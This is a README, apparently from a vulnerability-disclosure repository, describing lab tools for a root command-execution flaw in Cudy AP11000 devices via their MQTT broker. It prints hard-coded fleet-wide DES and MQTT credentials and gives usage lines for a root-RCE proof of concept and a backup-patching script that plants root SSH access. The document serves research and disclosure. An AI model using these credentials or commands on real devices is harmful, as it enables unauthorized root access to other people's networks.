# Mosquitto Bite: An RCE on Cudy AP's and Routers

Helper scripts for local AP11000 lab work.

## Secrets
DES Key: `88T3j05dtFu8=` \
SECRET: `CLOUDmqttabc&123` \
USER: `admincudydevice` \
TOPIC: `$SYS/broker/clients/connected`


## `cudy_crypt.py`

Local implementation of Cudy AP11000 `/usr/bin/crypt` for config backups,
diagnosis bundles, and standard AES/hex mode.

Examples:

```sh
tools/cudy_crypt.py -d -i backup.bin -o backup.tar.gz
tools/cudy_crypt.py -gd -i diagnosis.bin -o diagnosis.tar.gz
tools/cudy_crypt.py -e -i backup.tar.gz -o backup.bin
```

Supply secrets through environment variables when possible:

```sh
export CUDY_HOSTNAME=AP11000
read -s CUDY_BDINFO_SECRET
export CUDY_BDINFO_SECRET
```

## `tftp_serve.py`

Small local TFTP helper for recovery and bootloader workflows.

## `patch_backup_dropbear.py`

Patches a decrypted Cudy config-backup `.tar.gz` so restore starts dropbear with
key-only root auth from `/etc/rc.local`.

```sh
tools/patch_backup_dropbear.py \
  -i backup.tar.gz \
  -o root-backup-device-dropbear22.tar.gz \
  -k re/pwn_ed25519.pub
```

Encrypt the patched tarball with `tools/cudy_crypt.py` before restoring through
LuCI. Use a backup from the same device unless intentional config cloning is the
goal.

## `uboot_interrupt.py`

Helper for interrupting U-Boot / recovery workflows during lab work.

## `luadis.py`

Minimal Lua 5.1 bytecode disassembler, for the LuCI `.lua` files in the vendor
rootfs, which ship as stripped bytecode rather than source.

```sh
tools/luadis.py re/2.5.13/rootfs/usr/lib/lua/luci/dispatcher.lua | less
```

Handles the OpenWrt LNUM patch, which adds an integer constant type (tag 9) that
stock Lua 5.1 readers reject. Output is per-closure, with constants resolved, so
`grep` for a string literal then read the surrounding instructions.

## `mqtt_probe.py`

Read-only reachability probe for the AP's local MQTT broker. Connects with the
firmware's fleet-wide static JWT, subscribes to `$SYS/broker/clients/connected`,
prints the count and disconnects.

```sh
tools/mqtt_probe.py 10.2.1.68 10.2.1.7
```

Interpreting the count:

- `1` - only this probe is attached, so no `cmagent` is consuming commands.
- `2` or more - an agent is attached and the command topic has a live consumer.
- `CONNACK refused` - the static JWT was rejected, so the auth material changed.
- `SUBACK denied` - broker ACLs no longer allow the admin role to read `$SYS`.

Deliberately does not implement the `8883` TLS listener, which needs the shipped
client certificate that `/etc/init.d/mosquitto` decrypts to `/var/etc/mosquitto/`.
The `1883` listener needs no certificate, which is the point of the finding.

## `cudy_cmagent_rce.py`

Proof of concept for the `cmagent` MQTT root command execution issue. Standard
library only, no prior access to the target.

```sh
tools/cudy_cmagent_rce.py --selftest          # offline, no network
tools/cudy_cmagent_rce.py --check 10.2.1.68   # read-only, publishes nothing
tools/cudy_cmagent_rce.py 10.2.1.68 'id'      # root command execution
```

`--port` defaults to `1883`, the plaintext listener that needs no client
certificate. The `8883` listener needs the shipped client cert that
`/etc/init.d/mosquitto` decrypts to `/var/etc/mosquitto/`, which is why `1883` is
the one that matters.

## References

CVE-2026-71960: https://nvd.nist.gov/vuln/detail/CVE-2026-71960 \
CVE-2026-71961: https://nvd.nist.gov/vuln/detail/CVE-2026-71961 \
My Personal Blog Post and story: https://diskiller.net/blog/cudy-ap11000-mqtt-root.html \
The same key opens every box: Hunt-Benito's independent analysis of the WR3000 issue: \
https://www.hunt-benito.com/blog/the-same-key-opens-every-box-cve-2026-71960-hard-coded-jwt-secret-in-cudys-wr3000-mesh-mqtt-broker/
